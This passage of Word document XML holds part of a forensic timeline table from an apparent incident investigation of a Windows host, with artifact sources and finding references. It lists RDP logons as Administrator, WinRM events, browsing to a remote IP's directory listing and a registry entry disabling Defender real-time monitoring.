        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-022</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:35:54.789286</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-RemoteDesktopServices-RdpCoreTS/Operational 131 | Microsoft-Windows-RemoteDesktopServices-RdpCoreTS | RDP server accepted a new TCP connection | Connection Type: TCP | 10.42.85.10:62514</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#16805</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-RemoteDesktopServices-RdpCoreTS%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:22.980909</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>-</w:t>
              <w:br/>
              <w:t>Security 4624 | Microsoft-Windows-Security-Auditing | Successful logon | Target: C137.LOCAL\Administrator | LogonType 3 | LogonId: 0x842184 | AuthenticationPackageName: Kerberos | LogonProcessName: Kerberos | - | - (10.42.85.10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39563</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-011, F-018, F-023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:23.009739</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational 1149 | Microsoft-Windows-TerminalServices-RemoteConnectionManager | RDP network connection established | 10.42.85.10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#34902</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-TerminalServices-RemoteConnectionManager%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006, F-022, T-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432948</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C137\Administrator | LogonType 10 | LogonId: 0x857E73 | AuthenticationPackageName: Negotiate | LogonProcessName: User32  | C:\Windows\System32\svchost.exe | DESKTOP-SDN1RPT (10.42.85.10)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39576</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-001, F-006, F-018, F-023, I-013, I-019, T-004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432948</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Detection Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>critical</w:t>
              <w:br/>
              <w:t>RDP logon | {"AuthenticationPackageName":"Negotiate","LogonProcessName":"User32 ","TargetOutboundDomainName":"-","TargetLinkedLogonId":"0x0","LmPackageName":"-","TargetDomainName":"C137","SubjectUserName":"DESKTOP-SDN1RPT$","TargetUserSid":"S-1-5-21-2232410529-1445159330-2725690660-500","IpAddress":"10.42.85.10","KeyLength":0,"SubjectLogonId":"0x3e7","TargetLogonId":"0x857e73","ElevatedToken":"%%1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>chainsaw/chainsaw_0.jsonl#92</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-006</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:24.432952</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Security 4672 | Microsoft-Windows-Security-Auditing | Administrative logon | PrivilegeList: SeSecurityPrivilege, SeTakeOwnershipPrivilege, SeLoadDriverPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege | LogonId: 0x857E73</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#39577</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Security.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:36:56.014782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-WinRM/Operational 145 | Microsoft-Windows-WinRM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#36922</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-WinRM%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-024</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:37:00.089782</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-WinRM/Operational 142 | Microsoft-Windows-WinRM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#36925</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-WinRM%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-024</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:37:35.302000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>OneDrive (ODL logs)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>OneDrive: log entry</w:t>
              <w:br/>
              <w:t>UX.RequiredSignIn</w:t>
              <w:br/>
              <w:t>EventMachine.cpp EvtMachine::EventMachine::FireEvent UX.RequiredSignIn (SyncEngine-2020-09-19.0337.6904.1.aodl)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>odl/odl_Administrator_Personal.csv#1398</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-031</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge</w:t>
              <w:br/>
              <w:t>Directory listing for / (Microsoft Edge) http://194.61.24.102/ (http://194.61.24.102/) type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-027, F-029, I-015, T-026</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Search (activity history)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start</w:t>
              <w:br/>
              <w:t>http://194.61.24.102/</w:t>
              <w:br/>
              <w:t>Microsoft Edge Directory listing for / Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sidr/DESKTOP-SDN1RPT_Activity_History_Report_20261025_191826.918732700.csv#29</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\ProgramData\Microsoft\search\data\applications\windows\Windows.edb</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-027, F-029</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: last modified</w:t>
              <w:br/>
              <w:t>Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI</w:t>
              <w:br/>
              <w:t>Windows Security type=ExecuteOpen</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007, F-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start</w:t>
              <w:br/>
              <w:t>Microsoft.Windows.SecHealthUI_cw5n1h2txyewy!SecHealthUI</w:t>
              <w:br/>
              <w:t>type=InFocus duration=00:00:16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:39:44.301917</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows Defender\Real-Time Protection</w:t>
              <w:br/>
              <w:t>Threat Hunting | Windows Defender | DisableRealtimeMonitoring=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#8622</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
